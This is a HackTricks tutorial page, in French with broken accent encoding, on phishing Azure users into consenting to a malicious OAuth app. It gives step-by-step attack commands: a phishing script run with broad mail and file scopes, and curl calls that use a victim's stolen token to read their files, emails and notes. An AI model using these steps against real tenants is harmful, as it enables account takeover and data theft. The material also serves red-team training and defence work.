# Az - OAuth Apps Phishing

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Phishing d'applications OAuth

**Les applications Azure** sont configur√©es avec les autorisations qu'elles pourront utiliser lorsque l'utilisateur consent √† l'application (comme √©num√©rer le r√©pertoire, acc√©der aux fichiers ou effectuer d'autres actions). Notez que l'application agira au nom de l'utilisateur, donc m√™me si l'application peut demander des autorisations d'administration, si **l'utilisateur qui consent n'a pas cette autorisation**, l'application **ne pourra pas effectuer d'actions administratives**.

### Autorisations de consentement des applications

Par d√©faut, tout **utilisateur peut donner son consentement aux applications**, bien que cela puisse √™tre configur√© pour que les utilisateurs ne puissent consentir qu'aux **applications de publishers v√©rifi√©s pour des autorisations s√©lectionn√©es** ou m√™me **supprimer l'autorisation** pour que les utilisateurs puissent consentir √† des applications.

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Si les utilisateurs ne peuvent pas consentir, des **administrateurs** comme `GA`, `Application Administrator` ou `Cloud Application` `Administrator` peuvent **consentir aux applications** que les utilisateurs pourront utiliser.

De plus, si les utilisateurs peuvent consentir uniquement aux applications utilisant des autorisations **√† faible risque**, ces autorisations sont par d√©faut **openid**, **profile**, **email**, **User.Read** et **offline\_access**, bien qu'il soit possible d'**ajouter plus** √† cette liste.

Et s'ils peuvent consentir √† toutes les applications, ils peuvent consentir √† toutes les applications.

### 2 Types d'attaques

* **Non authentifi√©** : √Ä partir d'un compte externe, cr√©ez une application avec les **autorisations √† faible risque** `User.Read` et `User.ReadBasic.All`, par exemple, hame√ßonnez un utilisateur, et vous pourrez acc√©der aux informations du r√©pertoire.
* Cela n√©cessite que l'utilisateur hame√ßonn√© soit **capable d'accepter des applications OAuth d'un locataire externe**.
* Si l'utilisateur hame√ßonn√© est un administrateur qui peut **consentir √† n'importe quelle application avec n'importe quelles autorisations**, l'application pourrait √©galement **demander des autorisations privil√©gi√©es**.
* **Authentifi√©** : Ayant compromis un principal avec suffisamment de privil√®ges, **cr√©ez une application √† l'int√©rieur du compte** et **hame√ßonnez** un **utilisateur privil√©gi√©** qui peut accepter des autorisations OAuth privil√©gi√©es.
* Dans ce cas, vous pouvez d√©j√† acc√©der aux informations du r√©pertoire, donc l'autorisation `User.ReadBasic.All` n'est plus int√©ressante.
* Vous √™tes probablement int√©ress√© par des **autorisations qui n√©cessitent qu'un administrateur les accorde**, car un utilisateur ordinaire ne peut pas donner d'autorisations aux applications OAuth, c'est pourquoi vous devez **hame√ßonner uniquement ces utilisateurs** (plus d'informations sur les r√¥les/permissions qui accordent ce privil√®ge plus tard).

### Les utilisateurs sont autoris√©s √† consentir

Notez que vous devez ex√©cuter cette commande √† partir d'un utilisateur √† l'int√©rieur du locataire, vous ne pouvez pas trouver cette configuration d'un locataire depuis un externe. Le cli suivant peut vous aider √† comprendre les autorisations des utilisateurs :

{% code overflow="wrap" %}
```bash
az rest --method GET --url "https://graph.microsoft.com/v1.0/policies/authorizationPolicy"
```
{% endcode %}

* Les utilisateurs peuvent consentir √† toutes les applications : Si √† l'int√©rieur de **`permissionGrantPoliciesAssigned`** vous pouvez trouver : `ManagePermissionGrantsForSelf.microsoft-user-default-legacy` alors les utilisateurs peuvent accepter chaque application.
* Les utilisateurs peuvent consentir aux applications de publishers v√©rifi√©s ou de votre organisation, mais seulement pour les autorisations que vous s√©lectionnez : Si √† l'int√©rieur de **`permissionGrantPoliciesAssigned`** vous pouvez trouver : `ManagePermissionGrantsForOwnedResource.microsoft-dynamically-managed-permissions-for-team` alors les utilisateurs peuvent accepter chaque application.
* **D√©sactiver le consentement des utilisateurs** : Si √† l'int√©rieur de **`permissionGrantPoliciesAssigned`** vous ne pouvez trouver que : `ManagePermissionGrantsForOwnedResource.microsoft-dynamically-managed-permissions-for-chat` et `ManagePermissionGrantsForOwnedResource.microsoft-dynamically-managed-permissions-for-team` alors les utilisateurs ne peuvent consentir √† aucune.

Il est possible de trouver la signification de chacune des politiques comment√©es dans :

{% code overflow="wrap" %}
```bash
az rest --method GET --url "https://graph.microsoft.com/v1.0/policies/permissionGrantPolicies"
```
{% endcode %}

### **Administrateurs d'application**

V√©rifiez les utilisateurs qui sont consid√©r√©s comme des administrateurs d'application (peuvent accepter de nouvelles applications) :

{% code overflow="wrap" %}
```bash
# Get list of roles
az rest --method GET --url "https://graph.microsoft.com/v1.0/directoryRoles"

# Get Global Administrators
az rest --method GET --url "https://graph.microsoft.com/v1.0/directoryRoles/1b2256f9-46c1-4fc2-a125-5b2f51bb43b7/members"

# Get Application Administrators
az rest --method GET --url "https://graph.microsoft.com/v1.0/directoryRoles/1e92c3b7-2363-4826-93a6-7f7a5b53e7f9/members"

# Get Cloud Applications Administrators
az rest --method GET --url "https://graph.microsoft.com/v1.0/directoryRoles/0d601d27-7b9c-476f-8134-8e7cd6744f02/members"
```
{% endcode %}

## **Aper√ßu du Flux d'Attaque**

L'attaque implique plusieurs √©tapes ciblant une entreprise g√©n√©rique. Voici comment cela pourrait se d√©rouler :

1. **Enregistrement de Domaine et H√©bergement d'Application** : L'attaquant enregistre un domaine ressemblant √† un site de confiance, par exemple, "safedomainlogin.com". Sous ce domaine, un sous-domaine est cr√©√© (par exemple, "companyname.safedomainlogin.com") pour h√©berger une application con√ßue pour capturer des codes d'autorisation et demander des jetons d'acc√®s.
2. **Enregistrement de l'Application dans Azure AD** : L'attaquant enregistre ensuite une Application Multi-Tenant dans son locataire Azure AD, la nommant d'apr√®s l'entreprise cible pour para√Ætre l√©gitime. Il configure l'URL de redirection de l'application pour pointer vers le sous-domaine h√©bergeant l'application malveillante.
3. **Configuration des Autorisations** : L'attaquant configure l'application avec diverses autorisations API (par exemple, `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`). Ces autorisations, une fois accord√©es par l'utilisateur, permettent √† l'attaquant d'extraire des informations sensibles au nom de l'utilisateur.
4. **Distribution de Liens Malveillants** : L'attaquant cr√©e un lien contenant l'identifiant client de l'application malveillante et le partage avec des utilisateurs cibl√©s, les trompant pour qu'ils accordent leur consentement.

## Exemple d'Attaque

1. Enregistrer une **nouvelle application**. Elle peut √™tre uniquement pour le r√©pertoire actuel si vous utilisez un utilisateur du r√©pertoire attaqu√© ou pour n'importe quel r√©pertoire si c'est une attaque externe (comme dans l'image suivante).
1. D√©finir √©galement l'**URI de redirection** sur l'URL attendue o√π vous souhaitez recevoir le code pour obtenir des jetons (`http://localhost:8000/callback` par d√©faut).

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

2. Ensuite, cr√©er un secret d'application :

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

3. S√©lectionner les autorisations API (par exemple, `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`)

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

4. **Ex√©cuter la page web (**[**azure\_oauth\_phishing\_example**](https://github.com/carlospolop/azure_oauth_phishing_example)**)** qui demande les autorisations :

{% code overflow="wrap" %}
```bash
# From https://github.com/carlospolop/azure_oauth_phishing_example
python3 azure_oauth_phishing_example.py --client-secret <client-secret> --client-id <client-id> --scopes "email,Files.ReadWrite.All,Mail.Read,Notes.Read.All,offline_access,openid,profile,User.Read"
```
{% endcode %}

5. **Envoyez l'URL √† la victime**
1. Dans ce cas `http://localhost:8000`
6. **Les victimes** doivent **accepter l'invite :**

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

7. Utilisez le **jeton d'acc√®s pour acc√©der aux autorisations demand√©es** :
```bash
export ACCESS_TOKEN=<ACCESS_TOKEN>

# List drive files
curl -X GET \
https://graph.microsoft.com/v1.0/me/drive/root/children \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Accept: application/json"

# List eails
curl -X GET \
https://graph.microsoft.com/v1.0/me/messages \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Accept: application/json"

# List notes
curl -X GET \
https://graph.microsoft.com/v1.0/me/onenote/notebooks \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Accept: application/json"
```
## Autres Outils

* [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer)**:** Consultez [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) pour apprendre √† le configurer.
* [**O365-Attack-Toolkit**](https://github.com/mdsecactivebreach/o365-attack-toolkit)

## Post-Exploitation

### Phishing Post-Exploitation

Selon les autorisations demand√©es, vous pourriez √™tre en mesure de **acc√©der √† diff√©rentes donn√©es du locataire** (liste des utilisateurs, groupes... ou m√™me modifier des param√®tres) et **informations de l'utilisateur** (fichiers, notes, e-mails...). Ensuite, vous pouvez utiliser ces autorisations pour effectuer ces actions.

### Application Post Exploitation

V√©rifiez les sections Applications et Service Principal de la page :

{% content-ref url="../az-privilege-escalation/az-entraid-privesc/" %}
[az-entraid-privesc](../az-privilege-escalation/az-entraid-privesc/)
{% endcontent-ref %}

## R√©f√©rences

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
